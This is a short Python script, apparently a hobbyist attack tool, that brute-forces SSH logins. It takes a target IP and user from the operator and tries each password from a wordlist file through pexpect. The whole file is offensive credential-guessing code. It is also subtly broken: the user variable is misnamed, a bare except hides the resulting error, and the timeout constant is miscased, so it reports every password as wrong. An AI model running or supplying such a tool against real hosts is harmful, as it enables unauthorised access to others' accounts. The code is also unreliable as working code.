#!/usr/bin/python3



import pexpect

from termcolor import colored



PROMPT = ['#', '>>', '>', '\$']



def send_command(child,command):

	child.sendline(command)

	child.expect(PROMPT)

	print(child.before)



def connect(user,host,password):

	ssh_newkey = 'Are you sure you want to continue connecting?'

	connStr = 'ssh ' + user  + '@' + host

	child = pexpect.spawn(connStr)

	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:' ])

	if ret == 0:

		print('[-]Error connecting | Permisson denied')

		return

	if ret == 1:

		child.sendline('Yes')

		ret = child.expect([pexpect.timeout,'[P|p]assword:'])

		if ret == 0:

			print('[-]Error connecting | Permisson denied')

			send_command(child, 'whoami')

		return

	child.sendline(password)

	child.expect(PROMPT, timeout = 0.5)

	return child

	

	

def main():

	host = input("[+] Enter target IP where you want to bruteforce:")

	User = input("[+] Enter target User ID.=")

	file  = open('password.txt', 'r')

	for password in file.readlines():

		password = password.strip('\n')

		try:

			child = connect(user,host,password)

			print(colored("[+] Correct password | Match found : " + password,'green'))

		except:

			print(colored("[-] Wrong password : " + password,'red'))

			



main()